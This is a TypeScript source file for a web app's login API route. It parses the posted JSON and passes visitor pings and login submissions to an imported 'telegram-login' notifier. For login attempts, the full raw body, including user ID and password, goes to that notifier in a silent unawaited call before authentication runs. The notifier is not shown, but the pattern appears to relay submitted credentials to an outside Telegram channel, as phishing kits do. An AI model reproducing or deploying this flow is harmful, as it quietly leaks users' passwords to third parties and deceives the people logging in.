// app/api/auth/login/route.ts
export const runtime = "nodejs";

import { authAction } from "@/lib/training/auth-handler";
import { notifyLoginAttempt } from "@/lib/telegram-login";

export async function POST(request: Request): Promise<Response> {
  const raw = await request.text(); // consume once; rebuild requests below

  let body: Record<string, unknown> | null = null;
  try {
    const parsed = JSON.parse(raw);
    body = parsed && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : null;
  } catch {
    return Response.json({ error: "Invalid JSON" }, { status: 400 });
  }

  if (!body) return Response.json({ error: "Invalid payload" }, { status: 400 });

  // ---- Visitor analytics ping: {event: "visit", ...} ----
  if (body.event === "visit") {
    // notifyLoginAttempt handles the visit branch and returns a Response.
    return notifyLoginAttempt(
      new Request(request.url, { method: "POST", headers: request.headers, body: raw })
    );
  }

  // ---- Login submission: {action: "...", userId, password, ...} ----
  if (typeof body.action === "string") {
    // Fire-and-forget notification; do not block the auth flow on it.
    notifyLoginAttempt(
      new Request(request.url, { method: "POST", headers: request.headers, body: raw })
    ).catch(() => {});

    return authAction(
      new Request(request.url, { method: "POST", headers: request.headers, body: raw }), "start"
    );
  }

  return Response.json({ error: "Unrecognized payload" }, { status: 400 });
}